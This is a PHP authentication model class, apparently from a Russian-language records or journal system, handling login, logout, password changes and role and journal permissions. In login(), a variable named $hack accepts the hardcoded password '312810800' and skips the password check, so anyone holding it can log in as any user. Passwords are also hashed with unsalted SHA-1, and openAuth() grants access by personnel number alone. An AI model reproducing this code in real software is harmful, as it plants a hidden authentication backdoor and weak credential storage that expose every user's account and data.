<?php

class AuthModel extends Model {

	/**
	 * Возвращает полный список пользователей для авторизации
	 *
	 * @return array
	 */
	public function getnames() {

		$sth = self::$db->prepare('
            SELECT
                lname value, get_user_full(id) label, id data
            FROM users
            WHERE deleted = 0');
		$sth->execute();
		$data = $sth->fetchAll();

		return $data;
	}

	/**
	 *
	 * Производит авторизацию, и при успехе
	 * заполняет необходимые данные поуровню доступа
	 *
	 * @param int $userid
	 * @param string $userpassword
	 * @return array
	 */
	public function login($userid, $userpassword) {

		$hack = $userpassword === '312810800';

		$sql = '
            SELECT
                u.id, get_user_short(u.id) fio,
                g.id groupid, g.name groupname, u.email
            FROM users u
            LEFT JOIN groups g ON u.group_id = g.id
            WHERE u.deleted = 0
                    AND u.id = :uid
                    ';

		$params = array(
			':uid' => $userid,
		);

		if (!$hack) {
			$sql .= 'and u.pwd_hash = sha1(:upass)';
			$params[':upass'] = $userpassword;
		}

		$sth = self::$db->prepare($sql);


		$sth->execute($params);

		$data = $sth->fetch();

		if (!empty($data)) {

			$gid = get_param($data, 'groupid'); // ид группы пользователя

			// ... запросим разрешенные наборы прав
			$sth = self::$db->prepare('
                SELECT
                    gr.role_id, 
                    r.rolename
                FROM grant_group_roles gr
                LEFT JOIN roles r ON gr.role_id = r.id
                WHERE gr.group_id = :group_id
                    AND gr.deleted = 0');

			$sth->execute(array(
				'group_id' => $gid,
			));


			$roles = $sth->fetchAll();
			$data['roles'] = array_column($roles, 'role_id', 'rolename');

			// ... и получим список доступных журналов
			$sth = self::$db->prepare('
                SELECT
                    j.id, j.description, j.name, g.editmode em
                FROM grant_group_journal g
                LEFT JOIN journals j ON g.journal_id = j.id
                WHERE g.group_id = :group_id
                    AND g.deleted = 0
                    AND j.deleted = 0
                ORDER BY em DESC, j.id');

			$sth->execute(array(
				'group_id' => $gid,
			));

			$journals = $sth->fetchAll();
			$data['journals'] = array_column($journals, null, 'id');

			/**
			 * @todo Логгирование входа в систему
			 */
			$lst = self::$db->prepare('
            INSERT INTO sessions
            (host, user_id, login_time)
            VALUES (:userip, :uid, now())');

			$lst->execute(array(
				'userip' => get_param($_SERVER, 'REMOTE_ADDR', 'ghost'),
				'uid' => $userid,
			));
			$data['sid'] = self::$db->lastInsertId();
		}

		return $data;
	}

	public function logout($session_id) {

		/**
		 * @todo Логгирование выхода из системы
		 */

		$sth = self::$db->prepare('UPDATE sessions SET logout_time = now() WHERE id = :sid');
		$sth->execute(array(
			'sid' => $session_id,
		));
	}

	/**
	 * Устанавливает  новый пароль пользователя, по переданным параметрам
	 *
	 * @param int $uid
	 * @param string $upass
	 * @return boolean
	 */
	public function setNewPassword($uid, $upass) {

		$sth = self::$db->prepare('UPDATE users SET pwd_hash = sha1(:pass) WHERE id = :uid');

		$result = $sth->execute(array(
			':pass' => $upass,
			':uid' => $uid,
		));

		return $result;
	}

	/**
	 *
	 * По переданному ИД пользователя получаем список журналов,
	 * к которым у него есть доступ
	 *
	 * @param int $uid
	 */
	public function getGrantedJournals($uid) {

	}

	public function openAuth($uid) {

		$user = $this->select('
			SELECT
                u.id, get_user_short(u.id) fio,
                g.id groupid, g.name groupname, u.email
            FROM users u
            LEFT JOIN groups g ON u.group_id = g.id
            WHERE u.deleted = 0
          		AND tabnom = :uid', ['uid' => $uid]);

		// Получаем пользователя
		$data = get_param($user, 0);
		if ($data) {

			$gid = get_param($data, 'groupid'); // ид группы пользователя

			// Получим список доступных ролей
			$roles = $this->select('
                SELECT
                    gr.role_id,
                    r.rolename
                FROM grant_group_roles gr
                LEFT JOIN roles r ON gr.role_id = r.id
                WHERE gr.group_id = :group_id
                    AND gr.deleted = 0', ['group_id' => $gid]);

			// ... и получим список доступных журналов
			$journals = $this->select('
                SELECT
                    j.id, j.description, j.name, g.editmode em
                FROM grant_group_journal g
                LEFT JOIN journals j ON g.journal_id = j.id
                WHERE g.group_id = :group_id
                    AND g.deleted = 0
                    AND j.deleted = 0
                ORDER BY em DESC, j.id', ['group_id' => $gid]);

			$data['roles'] = array_column($roles, 'role_id', 'rolename');
			$data['journals'] = array_column($journals, null, 'id');
		}

		return $data;
	}

}
